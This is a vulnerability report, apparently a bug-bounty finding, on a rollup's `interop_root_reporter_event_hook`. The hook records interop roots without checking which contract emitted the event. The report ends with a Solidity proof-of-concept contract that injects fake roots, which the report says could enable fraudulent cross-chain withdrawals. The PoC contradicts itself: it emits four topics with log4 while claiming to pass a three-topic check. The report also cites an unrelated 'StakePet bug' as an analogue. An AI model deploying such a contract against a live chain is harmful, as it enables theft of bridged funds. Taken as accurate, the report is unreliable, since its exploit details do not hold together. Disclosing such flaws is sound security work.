### Title
Any Contract Can Inject Fake Interop Roots via Unguarded Event Hook - (File: `system_hooks/src/event_hooks/interop_root_reporter.rs`)

### Summary
The `interop_root_reporter_event_hook` processes `InteropRootAdded` events and writes interop roots into the system's `InteropRootStorage` without validating the address of the contract that emitted the event. Any unprivileged user can deploy a malicious contract that emits the `InteropRootAdded` event signature with crafted `chainId`, `blockOrBatchNumber`, and `root` values, causing the bootloader to record fake cross-chain roots. This corrupts the interop rolling hash committed to in the ZK proof public inputs and can enable fraudulent cross-chain message acceptance.

### Finding Description

**Root cause — missing emitter-address check in the event hook:**

`system_hooks/src/event_hooks/interop_root_reporter.rs` lines 19–81 define the hook:

```rust
pub fn interop_root_reporter_event_hook<S: EthereumLikeTypes>(
    topics: &arrayvec::ArrayVec<
        <S::IOTypes as SystemIOTypesConfig>::EventKey, MAX_EVENT_TOPICS>,
    data: &[u8],
    _caller_ee: u8,          // ← EE type only, NOT the emitter address; unused
    system: &mut System<S>,
    resources: &mut S::Resources,
) -> Result<(), SystemError>
```

The function signature carries no emitter address. The `_caller_ee` parameter (prefixed `_`, confirming it is unused) is only the execution-environment type. The hook therefore has no mechanism to restrict which contract's LOG triggered it.

The only guard present is a topic-signature check:

```rust
if topics.is_empty() || topics[0].as_u8_array() != INTEROP_ROOT_ADDED_EVENT_SIG {
    return Ok(());
}
```

After that, the hook validates the ABI layout of `data` (length == 96, offset == 32, array length == 1, topics length == 3) and unconditionally calls:

```rust
system.io.add_interop_root(
    ExecutionEnvironmentType::NoEE,
    resources,
    InteropRoot { root, block_or_batch_number, chain_id },
)?;
```

This is the exact analog of the StakePet bug: just as any address implementing `IYieldToken` was accepted without a whitelist, here any contract emitting the `InteropRootAdded` signature is accepted without an emitter whitelist.

**Contrast with call hooks (which do check the caller):**

Every call hook in the codebase explicitly validates the caller address before acting:
- `mint_base_token_hook`: `if caller != L2_BASE_TOKEN_ADDRESS { return empty; }`
- `set_bytecode_on_address_hook`: `if caller != CONTRACT_DEPLOYER_ADDRESS && caller != COMPLEX_UPGRADER_ADDRESS { return empty; }`
- `contract_deployer_temp_hook`: `if caller != COMPLEX_UPGRADER_ADDRESS { return empty; }`

The event hook has no equivalent guard.

**Attacker-controlled entry path:**

1. Attacker deploys a contract (no privilege required).
2. The contract emits a LOG4 with:
   - `topic[0]` = `INTEROP_ROOT_ADDED_EVENT_SIG` (`0x6b451b84…`)
   - `topic[1]` = attacker-chosen `chainId`
   - `topic[2]` = attacker-chosen `blockOrBatchNumber`
   - `data` = 96 bytes: `[0x00…20 || 0x00…01 || attacker_root_bytes32]`
3. The bootloader's event hook dispatch fires `interop_root_reporter_event_hook`.
4. The hook passes all format checks and calls `add_interop_root` with the fake root.

### Impact Explanation

`InteropRootStorage` feeds the interop rolling hash that is committed to in the ZK proof public inputs (batch commitment). Injecting fake roots has two concrete consequences:

1. **State-transition integrity break / proof divergence**: The rolling hash recorded in the batch output will differ from what any honest verifier or downstream chain expects, causing proof verification failures or forcing the sequencer to include the attacker's fabricated roots in the canonical state.

2. **Fraudulent cross-chain message acceptance**: Interop roots are the trust anchor for cross-chain message verification. A fake root for an attacker-controlled `chainId` and `blockOrBatchNumber` can be used to forge inclusion proofs for cross-chain messages that were never sent, enabling unauthorized withdrawal of bridged funds.

Both outcomes match the target scope: unauthorized state changes and direct theft/permanent lock of user funds.

### Likelihood Explanation

- Requires only deploying a contract and calling it — no privileged keys, no governance, no oracle manipulation.
- The crafted event data is trivially constructable from the public ABI.
- The attack is repeatable within a single block and can inject an arbitrary number of fake roots.

### Recommendation

Add an emitter-address check at the top of `interop_root_reporter_event_hook`, mirroring the pattern used by every call hook:

```rust
// Only L2_INTEROP_ROOT_STORAGE_ADDRESS is authorised to emit InteropRootAdded
if emitter_address != L2_INTEROP_ROOT_STORAGE_ADDRESS {
    return Ok(());
}
```

This requires threading the emitter address through the event hook dispatch mechanism (analogous to how `caller` is threaded through call hooks). Alternatively, the dispatch layer itself should filter events by emitter address before invoking the hook.

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract FakeInteropRootEmitter {
    // InteropRootAdded(uint256,uint256,bytes32[]) signature
    bytes32 constant SIG =
        0x6b451b8422636e45b93bf7f594fa2c1769d039766c4254a6e7f9c0ee1715cdb0;

    function inject(uint256 chainId, uint256 blockNum, bytes32 root) external {
        // Emit LOG4 matching the expected ABI layout:
        // data = abi.encode(uint256(32), uint256(1), root)
        bytes memory data = abi.encode(uint256(32), uint256(1), root);
        assembly {
            log4(
                add(data, 32), mload(data),
                // topic[0]: event signature
                0x6b451b8422636e45b93bf7f594fa2c1769d039766c4254a6e7f9c0ee1715cdb0,
                chainId,   // topic[1]
                blockNum,  // topic[2]
                0          // topic[3] (unused, satisfies topics.len()==3 check)
            )
        }
    }
}
```

Deploying this contract and calling `inject(attackerChainId, attackerBlock, fakeRoot)` causes `interop_root_reporter_event_hook` to pass all format checks and write `fakeRoot` into `InteropRootStorage`, corrupting the batch's interop rolling hash and enabling downstream cross-chain fraud.
